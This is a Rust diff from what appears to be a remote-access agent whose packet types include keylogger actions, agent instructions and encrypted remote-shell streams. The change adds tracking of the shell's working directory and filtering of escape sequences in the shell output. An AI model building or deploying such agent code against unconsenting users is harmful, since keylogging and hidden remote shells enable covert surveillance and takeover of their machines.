@@ -11,13 +11,13 @@ use shared::{
     error::NetworkError,
     multiplexing::{MIN_DATA_STREAM_ID, StreamId},
     packets::{
-        AgentInstruction, KeyloggerAction, Packet, Packets, ShellRequest,
+        AgentInstruction, KeyloggerAction, Packet, Packets, ShellCwd, ShellRequest,
         StreamClose, StreamData, StreamOpen, from_packet_bytes,
     },
 };
 
 use super::{ReadHalf, WriteHalf, client::Client, stream::Stream};
-use crate::shell::ShellSession;
+use crate::shell::{ShellSession, osc7::Osc7Scanner};
 use shared::encryption::{decrypt, encrypt};
 
 pub struct MultiplexManager {
@@ -221,6 +221,7 @@ impl MultiplexManager {
         }
     }
 
+    #[allow(clippy::too_many_lines)]
     fn handle_shell_request(
         self: &Arc<Self>,
         shell_req: &ShellRequest,
@@ -248,11 +249,24 @@ impl MultiplexManager {
 
         eprintln!("Shell stream opened: {stream_id}");
 
+        // Emit the initial cwd immediately so clients get the agent's spawn
+        // directory before the first shell prompt fires PROMPT_COMMAND.
+        if let Ok(cwd) = std::env::current_dir() {
+            let initial_cwd = ShellCwd {
+                stream_id,
+                path: cwd.to_string_lossy().into_owned(),
+            };
+            if let Ok(bytes) = initial_cwd.serialize() {
+                let _ = self.send_packet(&bytes);
+            }
+        }
+
         // Spawn thread to read shell output and send to stream
         let self_clone = self.clone();
         thread::spawn(move || {
             use std::io::Read;
 
+            let mut scanner = Osc7Scanner::new();
             let mut buffer = vec![0u8; 4096];
             loop {
                 // Check if process is still running
@@ -274,15 +288,27 @@ impl MultiplexManager {
                                 break;
                             }
                             Ok(n) => {
-                                let data_packet = StreamData {
-                                    stream_id,
-                                    data: buffer[..n].to_vec(),
-                                };
-                                if let Err(e) =
-                                    self_clone.send_packet(&data_packet.serialize().unwrap())
-                                {
-                                    eprintln!("Failed to send shell output: {e}");
-                                    break;
+                                let (clean, cwd_opt) = scanner.feed(&buffer[..n]);
+                                if !clean.is_empty() {
+                                    let data_packet = StreamData {
+                                        stream_id,
+                                        data: clean,
+                                    };
+                                    if let Err(e) =
+                                        self_clone.send_packet(&data_packet.serialize().unwrap())
+                                    {
+                                        eprintln!("Failed to send shell output: {e}");
+                                        break;
+                                    }
+                                }
+                                if let Some(path) = cwd_opt {
+                                    let cwd_packet = ShellCwd { stream_id, path };
+                                    if let Err(e) =
+                                        self_clone.send_packet(&cwd_packet.serialize().unwrap())
+                                    {
+                                        eprintln!("Failed to send shell cwd: {e}");
+                                        break;
+                                    }
                                 }
                             }
                             Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
